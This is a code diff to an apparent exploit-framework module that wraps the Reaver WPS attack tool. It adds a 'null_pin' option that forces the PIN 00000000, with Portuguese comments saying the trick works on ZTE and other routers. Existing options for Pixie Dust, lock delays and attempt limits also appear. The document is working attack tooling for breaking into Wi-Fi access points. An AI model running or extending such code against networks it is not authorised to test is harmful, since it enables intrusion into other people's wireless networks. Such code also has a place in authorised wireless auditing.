@@ -53,7 +53,8 @@ class Exploit(Exploit):
     target_bssid = OptString("", "BSSID do AP alvo (reaver; wash opcional com -b)")
     channel = OptString("", "Canal do AP (ex.: 6)")
     pixie_dust = OptBool(False, "Reaver: ataque Pixie Dust (-K)")
-    pin = OptString("", "Reaver: PIN fixo para tentar (-p)")
+    pin = OptString("", "Reaver: PIN fixo para tentar (-p); use '00000000' para null-PIN attack")
+    null_pin = OptBool(False, "Reaver: null-PIN attack (tenta PIN 00000000, eficaz em ZTE e outros)")
     delay = OptFloat(0.0, "Reaver: atraso entre tentativas de PIN, segundos (-d); 0 = omitir")
     lock_delay = OptFloat(0.0, "Reaver: espera após detecção de lock, segundos (-l); 0 = omitir")
     max_attempts = OptInteger(0, "Reaver: máximo de tentativas de PIN (-g); 0 = omitir")
@@ -98,9 +99,12 @@ class Exploit(Exploit):
             cmd.extend(["-c", ch])
         if self.pixie_dust:
             cmd.append("-K")
-        pin = str(self.pin).strip()
-        if pin:
-            cmd.extend(["-p", pin])
+        if self.null_pin:
+            cmd.extend(["-p", "00000000"])
+        else:
+            pin = str(self.pin).strip()
+            if pin:
+                cmd.extend(["-p", pin])
         if float(self.delay) > 0:
             cmd.extend(["-d", str(float(self.delay))])
         if float(self.lock_delay) > 0:
